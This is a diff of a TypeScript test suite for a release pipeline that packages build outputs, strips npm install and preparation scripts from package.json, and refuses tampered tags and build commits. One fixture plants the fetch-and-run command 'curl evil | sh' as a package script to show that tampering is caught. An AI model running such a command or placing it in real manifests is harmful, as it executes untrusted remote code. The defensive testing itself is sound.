@@ -22,9 +22,18 @@ import {
   anchorCheck,
   anchorReleasePr,
   boundaryCheck,
+  nextPublishVerdict,
+  npmVerdict,
+  type Packument,
+  PREPARATION_SCRIPTS,
+  type PublishVerdict,
   packageRelease,
+  prereleaseVersion,
+  prereleaseVersionOf,
   retagMajor,
+  stablePublishVerdict,
   verifyPublishedRefs,
+  versionOrder,
 } from "../../.github/scripts/release-pipeline.js";
 
 // Dozens of git spawns per test time out bun's 5s default under parallel machine load.
@@ -125,6 +134,58 @@ function commitAll(cwd: string, subject: string): string {
   return git(cwd, "rev-parse", "HEAD");
 }
 
+/** The files a build of `bundle` leaves in a checkout: the action bundle and
+ * the library build (its module and its declarations), all gitignored on main. */
+function builtFiles(bundle: string): Record<string, string> {
+  return {
+    "lib/index.js": bundle,
+    "lib/pkg/index.js": `library-${bundle}`,
+    "lib/pkg/index.d.ts": `types-${bundle}`,
+  };
+}
+
+function writeBuild(cwd: string, bundle: string): void {
+  for (const [file, content] of Object.entries(builtFiles(bundle))) {
+    write(cwd, file, content);
+  }
+}
+
+/** Stage the build outputs into a clone's index as the pipeline does (-f: they are gitignored). */
+function stageBuild(cwd: string): void {
+  git(cwd, "add", "-f", "--", "lib/index.js", "lib/pkg");
+}
+
+/** The fixture's package.json: one of each script pacote takes as a preparation trigger, beside one that is not. */
+function manifestJson(version: string, scripts: Record<string, string> = FIXTURE_SCRIPTS): string {
+  return `${JSON.stringify({ name: "@scope/pkg", version, scripts }, null, 2)}\n`;
+}
+const FIXTURE_SCRIPTS = {
+  ...Object.fromEntries(PREPARATION_SCRIPTS.map((name) => [name, `echo ${name}`])),
+  test: "bun test",
+};
+/** FIXTURE_SCRIPTS after the pipeline's strip: the preparation scripts gone, the rest kept. */
+const STRIPPED_SCRIPTS = { test: "bun test" };
+
+/** What a chain commit's package.json looks like: the pipeline strips the preparation scripts when it mints one. */
+function stripPrepare(cwd: string): void {
+  const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8")) as {
+    scripts?: Record<string, string>;
+  };
+  for (const name of PREPARATION_SCRIPTS) {
+    delete pkg.scripts?.[name];
+  }
+  write(cwd, "package.json", `${JSON.stringify(pkg, null, 2)}\n`);
+  git(cwd, "add", "package.json");
+}
+
+/** Whether a planter should strip the manifest as the pipeline does: the files include the library build (only
+ * commits minted after the strip carry it) and no explicit package.json says what the manifest is instead. */
+function shouldStripManifest(files: Record<string, unknown>): boolean {
+  return (
+    Object.keys(files).some((file) => file.startsWith("lib/pkg/")) && !("package.json" in files)
+  );
+}
+
 /** What every packaged tree lacks, so a planted chain commit deviates from the pipeline's only where the test means it to. */
 function stripWorkflows(cwd: string): void {
   git(cwd, "rm", "-r", "-q", "-f", "--cached", "--ignore-unmatch", "--", ".github/workflows");
@@ -134,8 +195,9 @@ function treePaths(cwd: string, sha: string): string[] {
   return git(cwd, "ls-tree", "-r", "--name-only", sha).split("\n");
 }
 
-/** The paths a chain commit's diff against its source lists: the workflow removal and the bundle. */
-const PACKAGED_DIFF = ".github/workflows/ci.yml\nlib/index.js";
+/** The paths a chain commit's diff against its source lists: the workflow removal and the build outputs. */
+const PACKAGED_DIFF =
+  ".github/workflows/ci.yml\nlib/index.js\nlib/pkg/index.d.ts\nlib/pkg/index.js\npackage.json";
 
 const CHANGELOG_21 = `# Changelog
 
@@ -177,7 +239,7 @@ function seedFixture(): Fixture {
   const origin = join(root, "origin.git");
   execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin]);
   const work = clone(root, origin, "work");
-  write(work, ".gitignore", "lib/index.js\n");
+  write(work, ".gitignore", "lib/index.js\nlib/pkg/\n");
   write(work, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.0.0" }, null, 2)}\n`);
   write(
     work,
@@ -196,19 +258,21 @@ function seedFixture(): Fixture {
   write(work, ".github/workflows/ci.yml", "name: ci\non: push\njobs: {}\n");
   write(work, ".github/dependabot.yml", "version: 2\nupdates: []\n");
   write(work, "src/marker.ts", "export const marker = 1;\n");
+  write(work, "package.json", manifestJson("2.0.0"));
   const seedSha = commitAll(work, "chore: seed the fixture at the 2.0.0 release");
   write(work, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.1.0" }, null, 2)}\n`);
   write(work, "CHANGELOG.md", CHANGELOG_21);
+  write(work, "package.json", manifestJson("2.1.0"));
   const mergeSha = commitAll(work, "chore(main): release 2.1.0 (#42)");
   git(work, "push", "--quiet", "origin", "HEAD:refs/heads/main");
-  write(work, "lib/index.js", "packaged-bundle-bytes-1\n");
+  writeBuild(work, "packaged-bundle-bytes-1\n");
   return { root, origin, work, seedSha, mergeSha };
 }
 
 function checkoutOf(fx: Fixture, name: string, sha: string, bundle: string): string {
   const dir = clone(fx.root, fx.origin, name);
   git(dir, "checkout", "--quiet", sha);
-  write(dir, "lib/index.js", bundle);
+  writeBuild(dir, bundle);
   return dir;
 }
 
@@ -218,7 +282,7 @@ function pushGreenCommit(fx: Fixture, name: string, bundle: string): { dir: stri
   write(dir, "src/marker.ts", `export const marker = "${name}";\n`);
   const sha = commitAll(dir, `feat: ${name}`);
   git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
-  write(dir, "lib/index.js", bundle);
+  writeBuild(dir, bundle);
   return { dir, sha };
 }
 
@@ -249,6 +313,16 @@ function shallowChecker(fx: Fixture, name: string): string {
 }
 
 const buildTip = (fx: Fixture): string => git(fx.origin, "rev-parse", "refs/heads/build");
+/** Author and committer of a commit, as the pipeline must stamp its own. */
+const identityOf = (cwd: string, sha: string): string =>
+  git(cwd, "log", "-1", "--format=%an <%ae> / %cn <%ce>", sha);
+const BOT = "settings-as-code-release <settings-as-code-release@users.noreply.github.com>";
+const BOT_IDENTITY = `${BOT} / ${BOT}`;
+/** The identity a clone's own config carries after the pipeline ran in it: clone() set it, and it must stay
+ * (a repo config the pipeline wrote would outlive the run and stamp every later commit from that checkout). */
+const localIdentity = (cwd: string): string =>
+  `${git(cwd, "config", "--local", "--get", "user.name")} <${git(cwd, "config", "--local", "--get", "user.email")}>`;
+const FIXTURE_IDENTITY = "fixture <fixture@example.invalid>";
 /** A commit's first parent as its object records it, whatever ref or shallow state the reading clone is in. */
 const parentOf = (cwd: string, sha: string): string =>
   git(cwd, "cat-file", "-p", sha).match(/^parent ([0-9a-f]{40})$/m)?.[1] ?? "";
@@ -266,8 +340,9 @@ function rivalChainCommit(
   const from = clone(fx.root, fx.origin, name);
   git(from, "checkout", "--quiet", source);
   stripWorkflows(from);
-  write(from, "lib/index.js", bundle);
-  git(from, "add", "-f", "lib/index.js");
+  writeBuild(from, bundle);
+  stageBuild(from);
+  stripPrepare(from);
   const tree = git(from, "write-tree");
   const sha = git(
     from,
@@ -436,10 +511,16 @@ describe("packageRelease", () => {
       ".release-please-manifest.json",
       "CHANGELOG.md",
       "lib/index.js",
+      "lib/pkg/index.d.ts",
+      "lib/pkg/index.js",
+      "package.json",
       "release-please-config.json",
       "src/marker.ts",
     ]);
     expect(git(fx.origin, "show", `${packaged}:lib/index.js`)).toBe("packaged-bundle-bytes-1");
+    expect(git(fx.origin, "show", `${packaged}:lib/pkg/index.js`)).toBe(
+      "library-packaged-bundle-bytes-1",
+    );
     const body = git(fx.origin, "log", "-1", "--format=%B", packaged);
     expect(body).toContain(`build: main at ${git(fx.origin, "rev-parse", "--short", fx.mergeSha)}`);
     expect(body).toContain("Workflow-run: https://example.invalid/actions/runs/1");
@@ -617,13 +698,32 @@ describe("packageRelease", () => {
     expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(tip);
   });
 
-  test("a rerun whose rebuild produced different bytes stops loudly", () => {
+  /** What a rerun's rebuild can get wrong under the packaged paths, and how the verification names it. */
+  const drifted: [string, (rerun: string) => void, RegExp][] = [
+    [
+      "the action bundle's bytes",
+      (rerun) => write(rerun, "lib/index.js", "DIFFERENT-bytes\n"),
+      /refs\/tags\/v2\.1\.0 carries a lib\/index\.js that is not a build of [0-9a-f]{40}'s source/,
+    ],
+    [
+      "the library declarations' bytes",
+      (rerun) => write(rerun, "lib/pkg/index.d.ts", "DIFFERENT-types\n"),
+      /refs\/tags\/v2\.1\.0 carries a lib\/pkg\/index\.d\.ts that is not a build of [0-9a-f]{40}'s source/,
+    ],
+    [
+      "an extra library file",
+      (rerun) => write(rerun, "lib/pkg/chunk.js", "extra\n"),
+      /refs\/tags\/v2\.1\.0 carries \[lib\/index\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\] under lib\/index\.js and lib\/pkg\/, while this build of [0-9a-f]{40} produced \[lib\/index\.js, lib\/pkg\/chunk\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\]/,
+    ],
+  ];
+  test.each(drifted)("a rerun whose rebuild differs in %s stops loudly", (_name, drift, error) => {
     const fx = seedFixture();
     packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
     const before = git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}");
-    const rerun = checkoutOf(fx, "rerun-drift", fx.mergeSha, "DIFFERENT-bytes\n");
+    const rerun = checkoutOf(fx, "rerun-drift", fx.mergeSha, "packaged-bundle-bytes-1\n");
+    drift(rerun);
     expect(() => packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /not a build of/,
+      error,
     );
     expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(before);
   });
@@ -647,6 +747,9 @@ describe("packageRelease", () => {
       write(planter, file, content);
       git(planter, "add", "-f", file);
     }
+    if (shouldStripManifest(files)) {
+      stripPrepare(planter);
+    }
     git(planter, "commit", "--quiet", "--allow-empty", ...message.flatMap((m) => ["-m", m]));
     for (const tag of tags) {
       git(planter, "tag", tag);
@@ -669,9 +772,7 @@ describe("packageRelease", () => {
   ];
   test.each(wrongSource)("an existing tag %s stops loudly", (_name, message, error) => {
     const fx = seedFixture();
-    const planted = plantTag(fx, "planter", fx.seedSha, message(fx), {
-      "lib/index.js": "planted\n",
-    });
+    const planted = plantTag(fx, "planter", fx.seedSha, message(fx), builtFiles("planted\n"));
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
       error,
     );
@@ -679,14 +780,14 @@ describe("packageRelease", () => {
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
   });
 
-  test("an existing tag that changes more than the bundle stops loudly", () => {
+  test("an existing tag that changes more than the build outputs stops loudly", () => {
     const fx = seedFixture();
     plantTag(fx, "planter-extra", fx.mergeSha, ["build: by hand", `Source: ${fx.mergeSha}`], {
-      "lib/index.js": "packaged-bundle-bytes-1\n",
+      ...builtFiles("packaged-bundle-bytes-1\n"),
       "src/marker.ts": "export const marker = 666;\n",
     });
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /is not .* plus lib\/index\.js and the removal of \.github\/workflows\/ alone: .*src\/marker\.ts/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*src\/marker\.ts/,
     );
   });
 
@@ -697,12 +798,12 @@ describe("packageRelease", () => {
       "planter-workflows",
       fx.mergeSha,
       ["build: by hand", `Source: ${fx.mergeSha}`],
-      { "lib/index.js": "packaged-bundle-bytes-1\n" },
+      builtFiles("packaged-bundle-bytes-1\n"),
       ["v2.1.0"],
       "kept",
     );
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /is not .* plus lib\/index\.js and the removal of \.github\/workflows\/ alone: .*: \.github\/workflows\/ci\.yml \(kept\)\)/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*: \.github\/workflows\/ci\.yml \(kept\)\)/,
     );
   });
 
@@ -711,8 +812,9 @@ describe("packageRelease", () => {
     const filler = clone(fx.root, fx.origin, `filler-${from.slice(0, 8)}`);
     git(filler, "checkout", "--quiet", fx.seedSha);
     stripWorkflows(filler);
-    write(filler, "lib/index.js", "packaged-bundle-bytes-0\n");
-    git(filler, "add", "-f", "lib/index.js");
+    writeBuild(filler, "packaged-bundle-bytes-0\n");
+    stageBuild(filler);
+    stripPrepare(filler);
     const tree = git(filler, "write-tree");
     let tip = from;
     for (let n = 0; n < count; n++) {
@@ -777,9 +879,7 @@ describe("packageRelease", () => {
       "planter-detached",
       fx.mergeSha,
       ["build: by hand", `Source: ${fx.mergeSha}`],
-      {
-        "lib/index.js": "packaged-bundle-bytes-1\n",
-      },
+      builtFiles("packaged-bundle-bytes-1\n"),
     );
     const refusal =
       `refs/tags/v2.1.0 (${planted}) is not on refs/heads/build (not an ancestor of its tip ` +
@@ -818,7 +918,7 @@ describe("packageRelease", () => {
       "planter-nobuild",
       fx.mergeSha,
       ["build: by hand", `Source: ${fx.mergeSha}`],
-      { "lib/index.js": "packaged-bundle-bytes-1\n" },
+      builtFiles("packaged-bundle-bytes-1\n"),
     );
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
       `refs/tags/v2.1.0 (${planted}) exists but refs/heads/build does not exist on origin; ` +
@@ -841,7 +941,7 @@ describe("packageRelease", () => {
     write(side, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.1.0" }, null, 2)}\n`);
     const sideSha = commitAll(side, "chore(main): release 2.1.0 (#43)");
     git(side, "push", "--quiet", "origin", "HEAD:refs/heads/side");
-    write(side, "lib/index.js", "packaged-bundle-bytes-1\n");
+    writeBuild(side, "packaged-bundle-bytes-1\n");
     let error: unknown;
     const pushes = withPushPlans(fx, [], () => {
       try {
@@ -870,20 +970,20 @@ describe("packageRelease", () => {
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
   });
 
-  test("a missing bundle refuses to package", () => {
+  test.each(["lib/index.js", "lib/pkg/index.js"])("a missing %s refuses to package", (file) => {
     const fx = seedFixture();
-    rmSync(join(fx.work, "lib/index.js"));
+    rmSync(join(fx.work, file));
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /not built/,
+      `${file} is not built; run the build before packaging.`,
     );
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
   });
 
-  test("a worktree dirty beyond the bundle refuses to package", () => {
+  test("a worktree dirty beyond the build outputs refuses to package", () => {
     const fx = seedFixture();
     write(fx.work, "src/marker.ts", "export const marker = 999;\n");
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /pending changes beyond lib\/index\.js/,
+      /pending changes beyond lib\/index\.js and lib\/pkg\//,
     );
     expect(remoteRef(fx, "refs/tags/v2.1.0")).toBe("");
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
@@ -904,7 +1004,7 @@ function prepareNextRelease(
   write(dir, ".release-please-manifest.json", `${JSON.stringify({ ".": version }, null, 2)}\n`);
   const mergeSha = commitAll(dir, `chore(main): release ${version} (#${prNumber})`);
   git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
-  write(dir, "lib/index.js", bundle);
+  writeBuild(dir, bundle);
   return { dir, mergeSha };
 }
 
@@ -916,6 +1016,8 @@ describe("retagMajor", () => {
     expect(moved).toEqual({ major: "v2", packagedSha });
     expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packagedSha);
     expect(buildTip(fx)).toBe(packagedSha);
+    expect(identityOf(fx.origin, packagedSha)).toBe(BOT_IDENTITY);
+    expect(localIdentity(fx.work)).toBe(FIXTURE_IDENTITY);
 
     const next = prepareNextRelease(fx, "2.1.1", 44, "packaged-bundle-bytes-2\n");
     const packaged = packageRelease({ cwd: next.dir, tag: "v2.1.1", sourceSha: next.mergeSha });
@@ -966,8 +1068,9 @@ describe("retagMajor", () => {
     stripWorkflows(planter);
     git(planter, "config", "user.name", "planter");
     git(planter, "config", "user.email", "planter@example.invalid");
-    write(planter, "lib/index.js", "planted-wrong-bytes\n");
-    git(planter, "add", "-f", "lib/index.js");
+    writeBuild(planter, "planted-wrong-bytes\n");
+    stageBuild(planter);
+    stripPrepare(planter);
     git(planter, "commit", "--quiet", "-m", "build: by hand", "-m", `Source: ${fx.mergeSha}`);
     git(planter, "tag", "v2.1.0");
     git(planter, "push", "--quiet", "origin", "refs/tags/v2.1.0");
@@ -1099,15 +1202,17 @@ describe("verifyPublishedRefs", () => {
     ).toThrow(/couldn't find remote ref/);
   });
 
-  test("a version tag that changes more than the bundle fails the confirmation", () => {
+  test("a version tag that changes more than the build outputs fails the confirmation", () => {
     const fx = seedFixture();
     // Parented on the seed, so nothing but the confirmation's own fetch can bring the merge commit's tree to a shallow checkout.
     const planter = clone(fx.root, fx.origin, "verify-planter-extra");
     git(planter, "checkout", "--quiet", fx.mergeSha);
     stripWorkflows(planter);
-    write(planter, "lib/index.js", "packaged-bundle-bytes-1\n");
+    writeBuild(planter, "packaged-bundle-bytes-1\n");
+    stageBuild(planter);
+    stripPrepare(planter);
     write(planter, "action.yml", "name: tampered\n");
-    git(planter, "add", "-f", "lib/index.js", "action.yml");
+    git(planter, "add", "-f", "action.yml");
     const planted = git(
       planter,
       "commit-tree",
@@ -1131,7 +1236,7 @@ describe("verifyPublishedRefs", () => {
     expect(() =>
       verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
     ).toThrow(
-      /is not .* plus lib\/index\.js and the removal of \.github\/workflows\/ alone: .*action\.yml/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*action\.yml/,
     );
   });
 
@@ -1141,8 +1246,8 @@ describe("verifyPublishedRefs", () => {
     git(planter, "checkout", "--quiet", fx.seedSha);
     git(planter, "config", "user.name", "planter");
     git(planter, "config", "user.email", "planter@example.invalid");
-    write(planter, "lib/index.js", "planted\n");
-    git(planter, "add", "-f", "lib/index.js");
+    writeBuild(planter, "planted\n");
+    stageBuild(planter);
     git(planter, "commit", "--quiet", "-m", "build: by hand", "-m", `Source: ${fx.seedSha}`);
     git(planter, "tag", "v2.1.0");
     git(planter, "tag", "v2");
@@ -1205,6 +1310,8 @@ describe("anchorReleasePr", () => {
     const worker = clone(fx.root, fx.origin, "anchor-worker");
     const result = anchorReleasePr({ cwd: worker, sourceSha: mainHead });
     expect(result.changed).toBe(true);
+    expect(identityOf(worker, "HEAD")).toBe(BOT_IDENTITY);
+    expect(localIdentity(worker)).toBe(FIXTURE_IDENTITY);
     const check = clone(fx.root, fx.origin, "anchor-check");
     git(check, "checkout", "--quiet", "release-please--branches--main");
     const config = JSON.parse(readFileSync(join(check, "release-please-config.json"), "utf8")) as {
@@ -1553,10 +1660,18 @@ describe("advanceBuild", () => {
     expect(parentOf(fx.origin, tip)).toBe("");
     expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
     expect(git(fx.origin, "show", `${tip}:lib/index.js`)).toBe("packaged-bundle-bytes-1");
+    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.js`)).toBe(
+      "library-packaged-bundle-bytes-1",
+    );
+    expect(git(fx.origin, "show", `${tip}:lib/pkg/index.d.ts`)).toBe(
+      "types-packaged-bundle-bytes-1",
+    );
     const body = git(fx.origin, "log", "-1", "--format=%B", tip);
     expect(body).toContain(`build: main at ${git(fx.origin, "rev-parse", "--short", fx.mergeSha)}`);
     expect(body).toContain("Workflow-run: https://example.invalid/actions/runs/7");
     expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
+    expect(identityOf(fx.origin, tip)).toBe(BOT_IDENTITY);
+    expect(localIdentity(fx.work)).toBe(FIXTURE_IDENTITY);
     expect(git(fx.work, "rev-parse", "HEAD")).toBe(fx.mergeSha);
     expect(git(fx.work, "status", "--porcelain")).toBe("");
 
@@ -1620,6 +1735,7 @@ describe("advanceBuild", () => {
     expect(paths.filter((path) => path.startsWith(".github/workflows/"))).toEqual([]);
     expect(paths).toContain(".github/dependabot.yml");
     expect(paths).toContain("lib/index.js");
+    expect(paths).toContain("lib/pkg/index.js");
     // GitHub judges a token's workflow-push refusal per push, so a workflow change between two appends is the shape the fixture can pin: the chain
     // commit carries neither workflow.
     const dir = clone(fx.root, fx.origin, "workflow-change");
@@ -1627,7 +1743,7 @@ describe("advanceBuild", () => {
     write(dir, ".github/workflows/nightly.yml", "name: nightly\non: schedule\njobs: {}\n");
     const sha = commitAll(dir, "ci: change the workflows");
     git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
-    write(dir, "lib/index.js", "packaged-bundle-bytes-2\n");
+    writeBuild(dir, "packaged-bundle-bytes-2\n");
     const second = advanceBuild({ cwd: dir, sourceSha: sha });
     expect(second.changed).toBe(true);
     expect(parentOf(fx.origin, second.buildSha)).toBe(first);
@@ -1635,7 +1751,7 @@ describe("advanceBuild", () => {
       treePaths(fx.origin, second.buildSha).filter((path) => path.startsWith(".github/workflows/")),
     ).toEqual([]);
     expect(git(fx.origin, "diff", "--name-only", sha, second.buildSha)).toBe(
-      ".github/workflows/ci.yml\n.github/workflows/nightly.yml\nlib/index.js",
+      ".github/workflows/ci.yml\n.github/workflows/nightly.yml\nlib/index.js\nlib/pkg/index.d.ts\nlib/pkg/index.js\npackage.json",
     );
   });
 
@@ -1669,8 +1785,9 @@ describe("advanceBuild", () => {
     const planter = clone(fx.root, fx.origin, name);
     git(planter, "checkout", "--quiet", source);
     stripWorkflows(planter);
-    write(planter, "lib/index.js", "planted\n");
-    git(planter, "add", "-f", "lib/index.js");
+    writeBuild(planter, "planted\n");
+    stageBuild(planter);
+    stripPrepare(planter);
     for (const [file, content] of Object.entries(files)) {
       write(planter, file, content);
       git(planter, "add", "-f", file);
@@ -1735,8 +1852,9 @@ describe("advanceBuild", () => {
     const filler = clone(fx.root, fx.origin, "latest-filler");
     git(filler, "checkout", "--quiet", fx.seedSha);
     stripWorkflows(filler);
-    write(filler, "lib/index.js", "packaged-bundle-bytes-0\n");
-    git(filler, "add", "-f", "lib/index.js");
+    writeBuild(filler, "packaged-bundle-bytes-0\n");
+    stageBuild(filler);
+    stripPrepare(filler);
     const tree = git(filler, "write-tree");
     let tip = kept;
     for (let n = 0; n < 51; n++) {
@@ -1826,7 +1944,7 @@ describe("advanceBuild", () => {
     name: string,
     from: string,
     message: string[],
-    files: Record<string, string | { linkTo: string }> = { "lib/index.js": "planted\n" },
+    files: Record<string, string | { linkTo: string }> = builtFiles("planted\n"),
   ): string {
     const planter = clone(fx.root, fx.origin, name);
     git(planter, "checkout", "--quiet", from);
@@ -1839,6 +1957,9 @@ describe("advanceBuild", () => {
         symlinkSync(content.linkTo, join(planter, file));
       }
       git(planter, "add", "-f", file);
+    }
+    if (shouldStripManifest(files)) {
+      stripPrepare(planter);
     }
     const paragraphs = message.flatMap((paragraph) => ["-m", paragraph]);
     git(planter, "commit", "--quiet", "--allow-empty", ...paragraphs);
@@ -1868,8 +1989,9 @@ describe("advanceBuild", () => {
     const rebuild = clone(fx.root, fx.origin, name);
     git(rebuild, "checkout", "--quiet", source);
     stripWorkflows(rebuild);
-    write(rebuild, "lib/index.js", "planted\n");
-    git(rebuild, "add", "-f", "lib/index.js");
+    writeBuild(rebuild, "planted\n");
+    stageBuild(rebuild);
+    stripPrepare(rebuild);
     return git(rebuild, "write-tree");
   }
 
@@ -1884,7 +2006,7 @@ describe("advanceBuild", () => {
     const expected = rebuiltTree(fx, `rebuilt-${planted.slice(0, 8)}`, source);
     return new Error(
       `refs/heads/build ${where} ${planted}, which names ${source} as its source but is not ` +
-        `${source} plus lib/index.js and the removal of .github/workflows/ alone: its tree is ` +
+        `${source} plus lib/index.js and lib/pkg/, minus package.json's preparation scripts, and the removal of .github/workflows/ alone: its tree is ` +
         `${actual}, the rebuilt one is ${expected} (paths beyond those changed relative to ` +
         `${source}: ${changed}); ${byHand}`,
     );
@@ -1895,8 +2017,9 @@ describe("advanceBuild", () => {
     const planter = clone(fx.root, fx.origin, "build-empty-subtree");
     git(planter, "checkout", "--quiet", from);
     stripWorkflows(planter);
-    write(planter, "lib/index.js", "planted\n");
-    git(planter, "add", "-f", "lib/index.js");
+    writeBuild(planter, "planted\n");
+    stageBuild(planter);
+    stripPrepare(planter);
     const emptyTree = execFileSync("git", ["hash-object", "-w", "-t", "tree", "--stdin"], {
       cwd: planter,
       input: "",
@@ -1964,20 +2087,20 @@ describe("advanceBuild", () => {
       },
     ],
     [
-      "naming this source but changing more than the bundle",
+      "naming this source but changing more than the build outputs",
       (fx) => {
         const planted = plantBuild(
           fx,
           "build-extra",
           fx.mergeSha,
           ["build: by hand", `Source: ${fx.mergeSha}`],
-          { "lib/index.js": "planted\n", "src/marker.ts": "export const marker = 666;\n" },
+          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
         );
         return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "src/marker.ts") };
       },
     ],
     [
-      "naming this source with a bundle that is not this checkout's build",
+      "naming this source with build outputs that are not this checkout's build",
       (fx) => {
         const genuine = checkoutOf(fx, "build-genuine", fx.mergeSha, "packaged-bundle-bytes-1\n");
         const built = advanceBuild({ cwd: genuine, sourceSha: fx.mergeSha }).buildSha;
@@ -1992,12 +2115,12 @@ describe("advanceBuild", () => {
           error: new Error(
             `refs/heads/build holds ${planted}, which names ${fx.mergeSha} as its source but ` +
               `its tree ${plantedTree} is not the tree ${tree} this checkout's build of ` +
-              `${fx.mergeSha} packages, so the two differ in their lib/index.js entry (bytes or ` +
-              "file mode): either the commit was not built from this source or the build is not " +
-              "reproducible, and the Source trailer cannot tell those apart. Diff the two trees " +
-              "by hand; a hand-pushed commit is left for the next green push to bury (the ruleset " +
-              "on build forbids moving it back), a build that differs between runs is fixed " +
-              "before build can be trusted.",
+              `${fx.mergeSha} packages, so the two differ under lib/index.js and lib/pkg/ (bytes, ` +
+              "file modes, or the files under lib/pkg/): either the commit was not built from this " +
+              "source or the build is not reproducible, and the Source trailer cannot tell those " +
+              "apart. Diff the two trees by hand; a hand-pushed commit is left for the next green " +
+              "push to bury (the ruleset on build forbids moving it back), a build that differs " +
+              "between runs is fixed before build can be trusted.",
           ),
         };
       },
@@ -2062,7 +2185,46 @@ describe("advanceBuild", () => {
       },
     ],
     [
-      "naming an older main commit and carrying a file beyond the bundle",
+      "naming this source with a package.json changed beyond its preparation scripts",
+      (fx) => {
+        const planted = plantBuild(
+          fx,
+          "build-manifest",
+          fx.mergeSha,
+          ["build: by hand", `Source: ${fx.mergeSha}`],
+          {
+            ...builtFiles("planted\n"),
+            "package.json": manifestJson("2.1.0", { test: "curl evil | sh" }),
+          },
+        );
+        return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "package.json") };
+      },
+    ],
+    [
+      "carrying the library build beside a package.json that kept its preparation scripts",
+      (fx) => {
+        // Only bundle-only commits predate the strip; a commit with lib/pkg/ was minted after it and is held to it.
+        const planted = plantBuild(
+          fx,
+          "build-prepare-kept",
+          fx.mergeSha,
+          ["build: by hand", `Source: ${fx.mergeSha}`],
+          { ...builtFiles("planted\n"), "package.json": manifestJson("2.1.0") },
+        );
+        return {
+          planted,
+          error: notAPackage(
+            fx,
+            "holds",
+            planted,
+            fx.mergeSha,
+            "package.json (preparation scripts kept)",
+          ),
+        };
+      },
+    ],
+    [
+      "naming an older main commit and carrying a file beyond the build outputs",
       (fx) => {
         // The append path: an older source is a valid parent only when its tip is a pure package, never with a foreign file riding along.
         const planted = plantBuild(
@@ -2070,7 +2232,7 @@ describe("advanceBuild", () => {
           "build-older-extra",
           fx.seedSha,
           ["build: by hand", `Source: ${fx.seedSha}`],
-          { "lib/index.js": "planted\n", "src/marker.ts": "export const marker = 666;\n" },
+          { ...builtFiles("planted\n"), "src/marker.ts": "export const marker = 666;\n" },
         );
         return { planted, error: notAPackage(fx, "is at", planted, fx.seedSha, "src/marker.ts") };
       },
@@ -2085,21 +2247,132 @@ describe("advanceBuild", () => {
     expect(remoteRef(fx, "refs/tags/latest")).toBe(latestBefore);
   });
 
-  test("an empty bundle never reaches build", () => {
+  test("the preparation triggers are the six pacote reads before it prepares a git dependency", () => {
+    // Pinned as a literal: the fixture derives from the exported list, so a name dropped there would vanish
+    // from the fixture too and the manifest test below could not see it go.
+    expect(PREPARATION_SCRIPTS).toEqual([
+      "prepare",
+      "prepack",
+      "build",
+      "preinstall",
+      "install",
+      "postinstall",
+    ]);
+  });
+
+  test("a chain commit's package.json is the source's without its preparation scripts, and a rerun holds it there", () => {
     const fx = seedFixture();
-    write(fx.work, "lib/index.js", "");
+    const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
+    expect(git(fx.origin, "show", `${tip}:package.json`)).toBe(
+      manifestJson("2.1.0", STRIPPED_SCRIPTS).trimEnd(),
+    );
+    expect(git(fx.origin, "show", `${fx.mergeSha}:package.json`)).toBe(
+      manifestJson("2.1.0").trimEnd(),
+    );
+    const rerun = checkoutOf(fx, "manifest-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
+    let again: ReturnType<typeof advanceBuild> | undefined;
+    const pushes = withPushPlans(fx, [], () => {
+      again = advanceBuild({ cwd: rerun, sourceSha: fx.mergeSha });
+    });
+    expect(again).toEqual({
+      changed: false,
+      buildSha: tip,
+      latestSha: tip,
+      reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${tip}`,
+    });
+    expect(pushes).toEqual([]);
+    expect(buildTip(fx)).toBe(tip);
+    expect(latestTag(fx)).toBe(tip);
+  });
+
